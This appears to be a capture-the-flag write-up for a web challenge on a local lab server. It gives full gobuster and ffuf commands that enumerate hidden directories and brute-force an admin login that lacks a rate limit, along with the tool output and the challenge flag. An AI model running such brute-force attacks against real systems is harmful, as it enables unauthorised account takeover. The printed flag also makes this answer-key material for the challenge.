---
layout: writeup

title: BRUTAL!!!
difficulty: Medium
points: 500
categories: [General]
tags: []

flag: CYS{b45ic_4cc0un7_74k30v3r}
---

# BRUTAL!!!

***WEB***
***ABHAY KRISHNA***

---

*This challenge demonstrates `web directory enumeration `and `Login Page Exploitation`using Rate Limit Exploitation *

## Initial Analysis:

* First when i see the website there where 4 visible directories. After visiting all the known directories and inspecting their source code, nothing useful is found.
* Tried to visit basic pages like `/admin` , `/flag.txt` and found that `/admin` page might be accessible if get through the right way as there is a page existing.

---
## Tools used:

1) *Gobuster*
2) *Ffuf*

---

## Solution:

1) Using the given clues `I am hidden among here FIND ME!!` and a given wordlist we can fairly assume that there might me hidden directories in the website.
2) Now we have to brute force all the web directories inside the wordlist. For that we can use the tool `gobuster`.

We will use the given wordlist for Brute-forcing.
```shell
gobuster dir -u http://localhost:3000/ -w wordlist.txt
```

- `dir` - Enumerating directories mode.
- `-u` - Used to specify the URL.
- `-w` - Used to specify the wordlist.

This command checks whether the web directories inside the `wordlist.txt` exists or not. If we see a `(Status: 200)` the page exists.

From here we can see the hidden directory `/TheHeartOfTheCanvas`. 

3) On visiting it we can see a login page.

4) On testing the login page, we can say that it has no `Rate Limit`. This helps us to execute passwords using Brute force without troubles or timeout.

5) There are several methods to brute-force this password field. One of them is using the tool `ffuf`.
```shell
ffuf -u http://localhost:3000/TheHeartOfTheCanvas/login -X POST -d "username=admin&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -w wordlist.txt
```

- `-u` - Specifies the URL 
*Note here the endpoint is `/TheHeartOfTheCanvas/login` and not `/TheHeartOfTheCanvas` as /login will the endpoint where we will receive the request*.
- `-X` - Sends HTTP POST requests as login forms are POST requests.
- `-d` - Request body (form-encoded). The literal token `FUZZ` is the placeholder that ffuf will replace with each entry from your wordlist. So for each line in `wordlist.txt` ffuf sends `password=<candidate>`.
- `-H` - Adds the header telling the server the body is form data (same as a normal HTML form).
- `-w` - Specify wordlist.

5) Here if we carefully see,
```

....
Pigments          [Status: 200, Size: 1044, Words: 133, Lines: 32, Duration: 32ms]
Lenses            [Status: 200, Size: 1044, Words: 133, Lines: 32, Duration: 27ms]
Cipher            [Status: 200, Size: 1044, Words: 133, Lines: 32, Duration: 26ms]
Anvil             [Status: 200, Size: 1044, Words: 133, Lines: 32, Duration: 32ms]
admin             [Status: 200, Size: 1044, Words: 133, Lines: 32, Duration: 34ms]
PrimaMateria      [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 32ms]
Metronome         [Status: 200, Size: 1044, Words: 133, Lines: 32, Duration: 32ms]
Overseer          [Status: 200, Size: 1044, Words: 133, Lines: 32, Duration: 264ms]
Warden            [Status: 200, Size: 1044, Words: 133, Lines: 32, Duration: 269ms]
Sirene            [Status: 200, Size: 1044, Words: 133, Lines: 32, Duration: 270ms]
....

```
 - We can see that the word `PrimaMateria` has a difference in size when we compare it with other words. This reveals that it is the password for this login page.
 - We can say that all of the others doesn't exist by checking one of the directory to test.

6) On logging in successfully we can see the flag.

## FLAG:

- `CYS{b45ic_4cc0un7_74k30v3r}`

---
